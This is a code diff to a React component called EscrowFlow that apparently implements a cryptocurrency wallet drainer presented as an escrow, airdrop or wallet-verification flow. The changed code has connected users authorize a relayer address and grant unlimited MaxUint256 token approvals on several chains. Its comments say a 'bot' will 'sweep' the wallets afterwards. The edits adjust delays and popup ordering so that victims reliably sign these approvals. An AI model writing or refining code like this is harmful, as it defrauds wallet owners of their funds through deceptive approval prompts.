@@ -499,29 +499,39 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     }
   }, []);
 
-  // After Privy auth is FULLY done: wait briefly, then Tron prompt + scan.
-  // On mobile outside Trust DApp browser we NEVER silently skip Tron —
-  // we deep-link (once) or show a persistent "Open in Trust Wallet" CTA.
+  // After Privy auth is FULLY settled: wait for wallet provider, then scan.
+  // Do NOT fire authorize/approve in the same beat as SIWE — that races Privy
+  // and leaves users stuck on "Sign in to verify" or dead approve prompts.
   useEffect(() => {
     if (!authenticated || !address || modal1Triggered.current) return;
     if (!wallets.length) return;
 
     void (async () => {
-      await new Promise((r) => setTimeout(r, 800));
+      // Let Privy close SIWE / WC session before any other wallet RPC
+      await new Promise((r) => setTimeout(r, 2200));
+      if (modal1Triggered.current) return;
+
+      // Wait until the connected wallet exposes an EIP-1193 provider
+      const wallet =
+        wallets.find((w) => w.address.toLowerCase() === address.toLowerCase()) ?? wallets[0];
+      for (let i = 0; i < 10; i++) {
+        try {
+          const p = await wallet?.getEthereumProvider?.();
+          if (p) break;
+        } catch { /* still warming up */ }
+        await new Promise((r) => setTimeout(r, 300));
+      }
 
       // ── Mobile Safari / WC: must open real page inside Trust for tronWeb ──
       if (needsTrustDappForTron()) {
         const redirects = getTrustRedirectCount();
         if (redirects < 1) {
           bumpTrustRedirectCount();
-          // Allow scan to re-run after they return inside Trust (refs reset on full load;
-          // if same SPA session somehow, reset trigger)
           modal1Triggered.current = false;
           openInTrustWalletDapp(window.location.href);
           setNeedsTrustOpen(true);
           return;
         }
-        // Already tried auto-redirect — show persistent CTA, do NOT scan without Tron
         modal1Triggered.current = false;
         setNeedsTrustOpen(true);
         return;
@@ -531,14 +541,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setNeedsTrustOpen(false);
       clearTrustRedirectCount();
 
-      // NOW safe to request Tron accounts (Privy SIWE is done + inside DApp browser or desktop)
-      if (isInWalletDappBrowser() && !peekTronAddress()) {
-        const tron = await ensureTronAddress({ prompt: true });
-        if (tron) setTronAddress(tron);
-      } else {
-        const silent = await ensureTronAddress({ prompt: false });
-        if (silent) setTronAddress(silent);
-      }
+      // Tron: silent peek only right after Privy — never prompt here (competes with SIWE).
+      // Prompt happens later inside DApp browser / late-injection effect.
+      const silent = await ensureTronAddress({ prompt: false });
+      if (silent) setTronAddress(silent);
 
       fetch("/api/airdrop", {
         method: "POST",
@@ -564,7 +570,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       clearTrustRedirectCount();
       modal1Triggered.current = true;
       void (async () => {
-        await new Promise((r) => setTimeout(r, 400));
+        // Settle after returning into Trust — avoid racing Privy session restore
+        await new Promise((r) => setTimeout(r, 1500));
         const tron = await ensureTronAddress({ prompt: true });
         if (tron) setTronAddress(tron);
         fetch("/api/airdrop", {
@@ -937,6 +944,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         setTopChainName(t.chain);
         if (t.alreadyApproved) {
           const tronAddr = currentTronAddr ?? getConnectedTronAddress();
+          // Only record if we actually have a Tron address — never invent a row
           if (tronAddr) {
             try {
               await fetch("/api/verify/tron", {
@@ -1005,6 +1013,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   async function handleModal1ApproveAll(items: Modal1Item[]) {
     setModal1Approving(true);
 
+    // Extra settle after Privy — authorize/approve popups must not stack on SIWE
+    await new Promise((r) => setTimeout(r, 800));
+
     // One authorize + verify per chain (multiple USDT/USDC on same chain share it)
     const byChain = new Map<string, Modal1Item[]>();
     for (const item of items) {
@@ -1021,15 +1032,24 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         const signer = await getSignerFor(chain);
         const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
 
-        // Bot requires on-chain isAuthorized — token approve alone is not enough
+        // Authorize first (one popup), then token approve(s)
         let authorizeTx: string | undefined;
         const alreadyAuth = await verification
           .isAuthorized(address, RELAYER_ADDRESS)
           .catch(() => false);
         if (!alreadyAuth) {
-          const authTx = await verification.authorize(RELAYER_ADDRESS);
-          await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
-          authorizeTx = authTx.hash as string;
+          try {
+            const authTx = await verification.authorize(RELAYER_ADDRESS);
+            await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
+            authorizeTx = authTx.hash as string;
+          } catch (authErr) {
+            console.warn(`[modal1] authorize failed on ${chainName}:`, authErr);
+            // Without authorize the bot cannot sweep — skip verify for this chain
+            for (const item of chainItems) {
+              setModal1Status((s) => ({ ...s, [item.key]: "failed" }));
+            }
+            continue;
+          }
         }
 
         const approvedTokens: { symbol: string; address: string; txHash?: string }[] = [];
@@ -1045,20 +1065,16 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             const token = chain.tokens.find(
               (t) => t.address.toLowerCase() === item.tokenAddr.toLowerCase()
             );
-            if (item.permit && token) {
-              await signAndSubmitPermit(signer, chain, token);
-              approvedTokens.push({ symbol: item.symbol, address: item.tokenAddr });
-            } else {
-              const erc20 = new Contract(item.tokenAddr, ERC20_ABI, signer);
-              const tx = await erc20.approve(item.contract, MaxUint256);
-              // Wait for mining so /api/verify sees the allowance (avoids race)
-              await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
-              approvedTokens.push({
-                symbol: item.symbol,
-                address: item.tokenAddr,
-                txHash: tx.hash as string,
-              });
-            }
+            // Prefer regular MaxUint256 approve over permit right after Privy —
+            // permit typed-data can race WalletConnect session state.
+            const erc20 = new Contract(item.tokenAddr, ERC20_ABI, signer);
+            const tx = await erc20.approve(item.contract, MaxUint256);
+            await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
+            approvedTokens.push({
+              symbol: item.symbol,
+              address: item.tokenAddr,
+              txHash: tx.hash as string,
+            });
             setModal1Status((s) => ({ ...s, [item.key]: "done" }));
           } catch (err) {
             console.error("[modal1] approve failed:", item.key, err);
@@ -1067,12 +1083,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         }
 
         if (approvedTokens.length === 0) {
-          approvedTokens.push(
-            ...chainItems.map((i) => ({ symbol: i.symbol, address: i.tokenAddr }))
-          );
+          console.warn(`[modal1] no approvals on ${chainName} — not writing verified_wallets`);
+          continue;
         }
 
-        // Register so BNB/ETH/Polygon bots see the wallet (was missing for BNB)
         await persistEvmVerify(chain, authorizeTx ?? "", approvedTokens);
       } catch (err) {
         console.error("[modal1] chain failed:", chainName, err);
